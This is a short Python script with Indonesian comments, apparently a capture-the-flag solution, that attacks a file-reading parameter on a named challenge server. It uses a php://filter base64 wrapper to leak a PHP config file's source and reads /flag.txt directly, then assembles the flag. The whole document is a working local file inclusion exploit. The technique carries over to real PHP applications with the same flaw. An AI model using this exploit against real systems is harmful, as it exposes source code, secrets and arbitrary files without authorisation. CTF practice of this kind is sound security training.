import requests
import base64
import re

# Konfigurasi target
BASE_URL = "http://tasks.4x10m.ru:20526/read.php?page="
PART1_PATH = "php://filter/convert.base64-encode/resource=config.php"
PART2_PATH = "/flag.txt"

def get_content(path):
    r = requests.get(BASE_URL + path)
    # Regex untuk mengambil teks di dalam tag <pre>
    match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
    return match.group(1).strip() if match else None

print("[*] Meluncur ke Perpustakaan Losyash...")

# 1. Ambil & Decode Part 1
encoded_part1 = get_content(PART1_PATH)
if encoded_part1:
    decoded_php = base64.b64decode(encoded_part1).decode()
    # Ekstraksi string flag dari source code PHP
    part1 = re.search(r"PART 1: (.*?)'", decoded_php).group(1)
    print(f"[+] Part 1 ditemukan: {part1}")

# 2. Ambil Part 2
part2_raw = get_content(PART2_PATH)
if part2_raw:
    part2 = part2_raw.replace("PART 2: ", "")
    print(f"[+] Part 2 ditemukan: {part2}")

# 3. Satukan Semuanya
if part1 and part2:
    full_flag = part1 + part2
    print("-" * 40)
    print(f"🏁 FULL FLAG: {full_flag}")
    print("-" * 40)
else:
    print("[!] Gagal mengumpulkan kepingan flag.")
